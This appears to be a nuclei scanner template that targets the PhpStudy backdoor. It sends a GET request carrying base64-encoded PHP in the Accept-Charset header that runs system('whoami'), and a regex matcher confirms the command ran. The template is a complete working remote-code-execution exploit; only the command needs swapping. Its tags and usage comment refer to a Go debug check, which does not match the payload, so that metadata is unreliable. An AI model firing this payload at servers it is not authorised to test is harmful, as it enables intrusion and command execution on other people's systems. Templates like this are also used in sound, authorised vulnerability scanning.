id: PhpStudyDoor
info:
  name: PhpStudyDoor
  author: 51pwn
  severity: critical
  reference:
    - https://github.com/hktalent/nuclei-templates
    - https://51pwn.com
  tags: web,go,debug

# nuclei -duc -u http://localhost:9999 -t ./51pwn/checkGoDebug.yaml

requests:
  - raw:
      - |+
        GET {{Path}} HTTP/1.1
        Host: {{Hostname}}
        Accept:*/*
        Pragma:no-cache
        Accept-Charset:{{base64(mypaths)}}
        Accept-Encoding:gzip, deflate
        Connection: close
        Content-Length: 0
        
      # end payload
    payloads:
      mypaths:
        - "echo '<result>'; system(\"whoami\");echo '</result>';"
        
    attack: pitchfork 
    unsafe: true

    req-condition: true
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - '<result>(.*?)</result>'